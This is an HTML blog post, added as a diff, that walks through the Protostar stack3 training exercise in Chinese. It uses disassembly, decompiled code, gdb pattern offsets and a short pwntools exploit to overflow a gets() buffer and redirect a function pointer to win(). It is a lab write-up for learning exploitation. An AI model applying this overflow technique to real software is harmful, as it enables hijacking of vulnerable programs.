@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>Protostar_stack3 - Dark&amp;Lord</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">Dark&amp;Lord</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">Protostar_stack3</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1699357075301"
+                  >2023</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1699360967402"
+                  >2023</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><p><strong>运行该程序，得到：</strong></p>
+<img src="/_resources/1bb9083030464157b72fb41cd08ab4c8.png" alt="fd20d5017e983f4e3989e72748790aed.png" width="188" height="44" class="jop-noMdConv" />
+<p><strong>checksec:</strong></p>
+<img src="/_resources/56e65f1a1c05409aa56663ac6cd7ad97.png" alt="b4ffe4d135417fa767acccdbc6bb7faa.png" width="286" height="119" class="jop-noMdConv" />
+<p><strong>objdump:</strong></p>
+<div><pre class="hljs"><code>└─$ objdump -t -j .text stack3
+
+stack3:     file format elf32-i386
+
+SYMBOL TABLE:
+08048370 l    d  .text  00000000              .text
+080483a0 l     F .text  00000000              __do_global_dtors_aux
+08048400 l     F .text  00000000              frame_dummy
+080484f0 l     F .text  00000000              __do_global_ctors_aux
+08048480 g     F .text  00000005              __libc_csu_fini
+08048370 g     F .text  00000000              _start
+08048424 g     F .text  00000014              win
+08048490 g     F .text  0000005a              __libc_csu_init
+080484ea g     F .text  00000000              .hidden __i686.get_pc_thunk.bx
+08048438 g     F .text  00000041              main</code></pre></div>
+<p><strong>查看汇编代码:</strong></p>
+<div><pre class="hljs"><code>gdb-peda$ disass main
+Dump of assembler code <span class="hljs-keyword">for</span> function main:
+   <span class="hljs-number">0x08048438</span> &lt;+<span class="hljs-number">0</span>&gt;:     push   ebp
+   <span class="hljs-number">0x08048439</span> &lt;+<span class="hljs-number">1</span>&gt;:     mov    ebp,esp
+   <span class="hljs-number">0x0804843b</span> &lt;+<span class="hljs-number">3</span>&gt;:     and    esp,<span class="hljs-number">0xfffffff0</span>
+   <span class="hljs-number">0x0804843e</span> &lt;+<span class="hljs-number">6</span>&gt;:     sub    esp,<span class="hljs-number">0x60</span>
+   <span class="hljs-number">0x08048441</span> &lt;+<span class="hljs-number">9</span>&gt;:     mov    DWORD PTR [esp+<span class="hljs-number">0x5c</span>],<span class="hljs-number">0x0</span>
+   <span class="hljs-number">0x08048449</span> &lt;+<span class="hljs-number">17</span>&gt;:    lea    eax,[esp+<span class="hljs-number">0x1c</span>]
+   <span class="hljs-number">0x0804844d</span> &lt;+<span class="hljs-number">21</span>&gt;:    mov    DWORD PTR [esp],eax
+   <span class="hljs-number">0x08048450</span> &lt;+<span class="hljs-number">24</span>&gt;:    call   <span class="hljs-number">0x8048330</span> &lt;gets@plt&gt;
+   <span class="hljs-number">0x08048455</span> &lt;+<span class="hljs-number">29</span>&gt;:    cmp    DWORD PTR [esp+<span class="hljs-number">0x5c</span>],<span class="hljs-number">0x0</span>
+   <span class="hljs-number">0x0804845a</span> &lt;+<span class="hljs-number">34</span>&gt;:    je     <span class="hljs-number">0x8048477</span> &lt;main+<span class="hljs-number">63</span>&gt;
+   <span class="hljs-number">0x0804845c</span> &lt;+<span class="hljs-number">36</span>&gt;:    mov    eax,<span class="hljs-number">0x8048560</span>
+   <span class="hljs-number">0x08048461</span> &lt;+<span class="hljs-number">41</span>&gt;:    mov    edx,DWORD PTR [esp+<span class="hljs-number">0x5c</span>]
+   <span class="hljs-number">0x08048465</span> &lt;+<span class="hljs-number">45</span>&gt;:    mov    DWORD PTR [esp+<span class="hljs-number">0x4</span>],edx
+   <span class="hljs-number">0x08048469</span> &lt;+<span class="hljs-number">49</span>&gt;:    mov    DWORD PTR [esp],eax
+   <span class="hljs-number">0x0804846c</span> &lt;+<span class="hljs-number">52</span>&gt;:    call   <span class="hljs-number">0x8048350</span> &lt;<span class="hljs-built_in">printf</span>@plt&gt;
+   <span class="hljs-number">0x08048471</span> &lt;+<span class="hljs-number">57</span>&gt;:    mov    eax,DWORD PTR [esp+<span class="hljs-number">0x5c</span>]
+   <span class="hljs-number">0x08048475</span> &lt;+<span class="hljs-number">61</span>&gt;:    call   eax
+   <span class="hljs-number">0x08048477</span> &lt;+<span class="hljs-number">63</span>&gt;:    leave
+   <span class="hljs-number">0x08048478</span> &lt;+<span class="hljs-number">64</span>&gt;:    ret
+End of assembler dump.
+gdb-peda$ disass win
+Dump of assembler code <span class="hljs-keyword">for</span> function win:
+   <span class="hljs-number">0x08048424</span> &lt;+<span class="hljs-number">0</span>&gt;:     push   ebp
+   <span class="hljs-number">0x08048425</span> &lt;+<span class="hljs-number">1</span>&gt;:     mov    ebp,esp
+   <span class="hljs-number">0x08048427</span> &lt;+<span class="hljs-number">3</span>&gt;:     sub    esp,<span class="hljs-number">0x18</span>
+   <span class="hljs-number">0x0804842a</span> &lt;+<span class="hljs-number">6</span>&gt;:     mov    DWORD PTR [esp],<span class="hljs-number">0x8048540</span>
+   <span class="hljs-number">0x08048431</span> &lt;+<span class="hljs-number">13</span>&gt;:    call   <span class="hljs-number">0x8048360</span> &lt;<span class="hljs-built_in">puts</span>@plt&gt;
+   <span class="hljs-number">0x08048436</span> &lt;+<span class="hljs-number">18</span>&gt;:    leave
+   <span class="hljs-number">0x08048437</span> &lt;+<span class="hljs-number">19</span>&gt;:    ret
+End of assembler dump.</code></pre></div>
+<p><strong>查看反编译代码:</strong></p>
+<div><pre class="hljs"><code><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
+{
+    undefined auStack84 [<span class="hljs-number">64</span>];
+    code *pcStack20;
+    
+    pcStack20 = (code *)<span class="hljs-number">0x0</span>;
+    gets(auStack84);
+    <span class="hljs-keyword">if</span> (pcStack20 != (code *)<span class="hljs-number">0x0</span>) {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"calling function pointer, jumping to 0x%08x\n"</span>, pcStack20);
+        (*pcStack20)();
+    }
+    <span class="hljs-keyword">return</span>;
+}</code></pre></div>
+<div><pre class="hljs"><code><span class="hljs-type">void</span> <span class="hljs-title function_">win</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
+{
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"code flow successfully changed"</span>);
+    <span class="hljs-keyword">return</span>;
+}</code></pre></div>
+<p>本题目是获取输入并传递给 <code>auStack84 [64]</code>数组，由于使用了不安全的<code>gets</code>函数(其并没有检测输入的长度)，所以以输入过长的数据用以达到溢出的目的，从而修改<code>pcStack20</code>的值</p>
+<p>在通过溢出修改<code>pcStack20</code>的值后，就可以进入 <code>if (pcStack20 != (code *)0x0)</code> ，从而执行被修改后的<code>pcStack</code>指向的地址</p>
+<p><strong>接下来，我们获取需要进行溢出的缓冲区的大小：</strong></p>
+<div><pre class="hljs"><code><span class="hljs-meta">gdb-peda$ </span><span class="language-bash">pattern_create 200</span>
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
+<span class="hljs-meta">gdb-peda$ </span><span class="language-bash">file stack3</span>
+Reading symbols from stack3...
+<span class="hljs-meta">gdb-peda$ </span><span class="language-bash">run</span>
+Starting program: /opt/protostar/bin/stack3 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+<span class="hljs-meta">AAA%</span><span class="language-bash">AAsAABAA<span class="hljs-variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA</span>
+calling function pointer, jumping to 0x41644141
+。。。。。。
+
+
+[----------------------------------registers-----------------------------------]
+EAX: 0x41644141 ('AAdA')
+EBX: 0xf7e1dff4 --&gt; 0x21dd8c 
+ECX: 0xffffce7c --&gt; 0x7363be00 
+EDX: 0x1 
+ESI: 0x8048490 (&lt;__libc_csu_init&gt;:      push   ebp)
+EDI: 0xf7ffcba0 --&gt; 0x0 
+EBP: 0xffffcf28 ("AA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+ESP: 0xffffcebc --&gt; 0x8048477 (&lt;main+63&gt;:       leave)
+EIP: 0x41644141 ('AAdA')
+EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x41644141
+[------------------------------------stack-------------------------------------]
+0000| 0xffffcebc --&gt; 0x8048477 (&lt;main+63&gt;:      leave)
+0004| 0xffffcec0 --&gt; 0x8048560 ("calling function pointer, jumping to 0x%08x\n")
+0008| 0xffffcec4 ("AAdA\350\325\377\367\034")
+0012| 0xffffcec8 --&gt; 0xf7ffd5e8 --&gt; 0xf7fca000 --&gt; 0x464c457f 
+0016| 0xffffcecc --&gt; 0x1c 
+0020| 0xffffced0 --&gt; 0xf7ffcff4 --&gt; 0x32f34 
+0024| 0xffffced4 --&gt; 0xc ('\x0c')
+0028| 0xffffced8 --&gt; 0x0 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41644141 in ?? ()</code></pre></div>
+<p> 可以看到<code>Invalid $PC address: 0x41644141</code></p>
+<p>求其偏移长度：</p>
+<div><pre class="hljs"><code><span class="hljs-meta">gdb-peda$ </span><span class="language-bash">pattern_offset 0x41644141</span>
+1097089345 found at offset: 64</code></pre></div>
+<p>即需要溢出的长度为64,我们还需要win函数的地址，这个已经在上面找到，即<code>0x08048424</code>：</p>
+<div><pre class="hljs"><code><span class="hljs-meta">gdb-peda$ </span><span class="language-bash">disass win</span>
+Dump of assembler code for function win:
+   0x08048424 &lt;+0&gt;:     push   ebp</code></pre></div>
+<p><strong>PS:0x08048424需要写成小端序</strong></p>
+<p>exp如下：</p>
+<div><pre class="hljs"><code>In [<span class="hljs-number">1</span>]: <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+In [<span class="hljs-number">2</span>]: payload = <span class="hljs-string">'A'</span>*<span class="hljs-number">64</span> + <span class="hljs-string">'\x24\x84\x04\x08'</span>
+
+In [<span class="hljs-number">3</span>]: sh = process(<span class="hljs-string">"./stack3"</span>)
+[x] Starting local process <span class="hljs-string">'./stack3'</span>
+[+] Starting local process <span class="hljs-string">'./stack3'</span>: pid <span class="hljs-number">204414</span>
+
+In [<span class="hljs-number">4</span>]: sh.sendline(payload)
+&lt;ipython-<span class="hljs-built_in">input</span>-<span class="hljs-number">4</span>-96fbe51e0736&gt;:<span class="hljs-number">1</span>: BytesWarning: Text <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">bytes</span>; assuming ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">1</span>, no guarantees. See https://docs.pwntools.com/<span class="hljs-comment">#bytes</span>
+  sh.sendline(payload)
+
+In [<span class="hljs-number">5</span>]: sh.recvall()
+[x] Receiving <span class="hljs-built_in">all</span> data
+[x] Receiving <span class="hljs-built_in">all</span> data: 0B
+[*] Process <span class="hljs-string">'./stack3'</span> stopped <span class="hljs-keyword">with</span> exit code <span class="hljs-number">31</span> (pid <span class="hljs-number">204414</span>)
+[x] Receiving <span class="hljs-built_in">all</span> data: 79B
+[+] Receiving <span class="hljs-built_in">all</span> data: Done (79B)
+Out[<span class="hljs-number">5</span>]: <span class="hljs-string">b'calling function pointer, jumping to 0x08048424\ncode flow successfully changed\n'</span></code></pre></div>
+<p> </p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
